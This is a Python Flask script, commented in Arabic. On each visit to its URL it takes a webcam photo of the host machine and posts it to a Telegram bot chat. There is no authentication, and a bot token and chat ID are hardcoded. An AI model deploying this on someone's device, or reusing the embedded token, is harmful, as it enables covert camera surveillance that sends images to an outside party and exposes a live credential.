#!/usr/bin/env python3 # -*- coding: utf-8 -*- """ Camera Web - التقاط صورة عند فتح الرابط وإرسالها إلى تلغرام """ import os import cv2 import requests import datetime from flask import Flask, send_file # ============================================================ # الإعدادات # ============================================================ BOT_TOKEN = os.getenv("BOT_TOKEN", "8747240774:AAGZbAx1rPOIVynko2cvWyCSBc0DW-bJXI0") CHAT_ID = os.getenv("CHAT_ID", "8977766960") SAVE_DIR = "captures" os.makedirs(SAVE_DIR, exist_ok=True) app = Flask(__name__) # ============================================================ # التقاط صورة # ============================================================ def capture_image(): cam = cv2.VideoCapture(0) if not cam.isOpened(): return None for _ in range(5): cam.read() ret, frame = cam.read() cam.release() if not ret: return None ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") path = os.path.join(SAVE_DIR, f"{ts}.jpg") cv2.imwrite(path, frame) return path # ============================================================ # إرسال إلى تلغرام # ============================================================ def send_photo(path): url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" caption = ( f"📸 صورة جديدة\n" f"🕒 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}" ) try: with open(path, "rb") as f: r = requests.post( url, files={"photo": f}, data={"chat_id": CHAT_ID, "caption": caption}, timeout=30 ) return r.status_code == 200 except Exception as e: print(f"خطأ: {e}") return False # ============================================================ # المسار الرئيسي: يلتقط صورة ويرسلها # ============================================================ @app.route("/") def index(): path = capture_image() if path: send_photo(path) return send_file(path, mimetype="image/jpeg") return "❌ الكاميرا غير متاحة", 500 # ============================================================ # التشغيل # ============================================================ if __name__ == "__main__": app.run(host="0.0.0.0", port=8080, debug=False)
